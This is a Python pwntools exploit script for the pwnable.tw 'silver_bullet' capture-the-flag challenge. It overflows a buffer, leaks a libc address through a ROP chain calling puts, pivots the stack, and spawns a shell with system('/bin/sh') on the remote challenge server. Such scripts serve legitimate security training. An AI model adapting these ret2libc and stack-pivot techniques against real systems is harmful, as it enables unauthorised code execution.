from pwn import *


sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)


elf = context.binary = ELF('silver_bullet')
libc = ELF('libc.so.6')

def create_bullet(data):
    sla(b'choice :', b'1')
    sa(b'description of bullet :', data)
def power_up(data):
    sla(B'choice :', b'2')
    sa(B' bullet :', data)
def beat():
    sla(b'choice :', b'3')


#nc chall.pwnable.tw 10103

p = remote('chall.pwnable.tw', 10103)
#p = process()
#gdb.attach(p, gdbscript='''
#           b *0x080489bd
#           b *0x08048a19
#c''')

BSS = 0x804b030 + 0x300
LEAVE = 0x08048641
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.read_input(BSS, 0x10101010)
rop.raw(p32(LEAVE))

print(rop.dump())
print(rop.chain())

print('len: ', hex(len(rop.chain())))
if b'\x00' in rop.chain():
    print('not ok')
else:
    print('ok')


create_bullet(b'A'*0x2f)
power_up(b'A')
power_up(b'\xff'*3 + p32(BSS) + rop.chain())
beat()
p.recvuntil(b'ou win !!\n')
leak = p.recv(4)
leak = int.from_bytes(leak, byteorder='little')
libc.address = leak - libc.symbols['puts']
print('leak: ', hex(leak))
print('libc: ', hex(libc.address))

rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

p.send(b'A'*4 + rop.chain())

p.interactive()